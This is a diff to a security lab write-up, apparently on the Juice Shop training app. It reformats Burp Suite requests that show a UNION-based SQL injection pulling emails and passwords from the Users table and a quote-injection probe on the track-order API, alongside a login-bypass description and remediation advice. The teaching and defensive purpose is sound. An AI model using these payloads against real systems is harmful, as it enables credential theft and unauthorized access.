@@ -141,7 +141,7 @@ Use prepared statements and whitelisted search patterns. Never directly put user
 **Instructions:**
 ```
 In Burp Suite:
-GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%%2C%20%278%27%2C%20%279%27%20FROM%20Users--HTTP/1.1
+GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%%2C%20%278%27%2C%20%279%27%20FROM%20Users-- HTTP/1.1
 ```
 This is the same as: “q=')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users”
 #### Track Order API
@@ -157,9 +157,12 @@ An attacker can alter the SQL query executed by the application. In a real syste
 - Use parameterized SQL queries for everything that deals with the database
 - Validate the order ID so that only the expected format is accepted.
 - Implement generic error messages so SQL errors do not reveal backend details.
-**Instructions:**
-GET /rest/track-order/5267-6f6928d0e342ac97' HTTP/1.1
 
+**Instructions:**
+```
+In Burp Suite:
+GET /rest/track-order/5267-6f6928d0e342ac97' HTTP/1.1
+```
 ### 3.7 Login Bypass (Jim & Bender):
 The login mechanism was vulnerable to SQL injections due to unsafe string concatenation in the authentication query. By injecting SQL comment markers and operators into the username field, it was possible to terminate the original WHERE clause and force asuccessful login without knowing the password. This allowed authentication as users such as Jim and/or Bender.
 
